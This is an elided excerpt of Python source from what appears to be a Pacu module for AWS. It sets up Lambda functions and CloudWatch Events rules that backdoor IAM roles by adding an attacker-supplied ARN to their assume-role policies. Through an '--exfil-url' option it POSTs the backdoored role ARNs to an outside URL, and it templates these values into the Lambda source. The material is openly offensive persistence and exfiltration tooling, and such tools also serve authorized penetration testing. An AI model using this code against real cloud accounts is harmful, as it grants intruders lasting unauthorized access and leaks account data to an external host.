...
parser.add_argument(
    ...
    required=False,
    default=None,
    help="The ARN of your own IAM user or role that you want to add to the assume role policy document.",
)
parser.add_argument(
    "--exfil-url",
    required=False,
    default=None,
    help="The URL to POST backdoored roles' ARNs to, so you can assume them.",
)
parser.add_argument(
    "--role-arn",
    required=False,
    default=None,
    help="The role should allow Lambda to assume it and have at least the IAM UpdateAssumeRolePolicy and GetRole permissions",
)
parser.add_argument(
    "--cleanup",
    required=False,
...
def main(args, pacu_main):
                ...
                try:
                    ...
                    print(
                        "  Failed to remove {}".format(
                            str(CREATED_LAMBDA_FUNCTIONS_PATH)
                        )
                    )
        ...
        if created_cwe_rules:
            ...
            if delete_cwe_file:
                try:
                    ...
                    print(
                        "  Failed to remove {}".format(
                            str(CREATED_CLOUDWATCH_EVENTS_RULES_PATH)
                        )
                    )
                    print("    {}: {}".format(type(error), error))
    ...
    if not args.role_arn:
        target_role_arn = input(
            "  What role should be used? Note: The role should allow Lambda to assume it and have at "
    ...
    source_code = source_code.replace("POST_URL", args.exfil_url).replace(
        "BACKDOOR_ARN", args.arn
    )
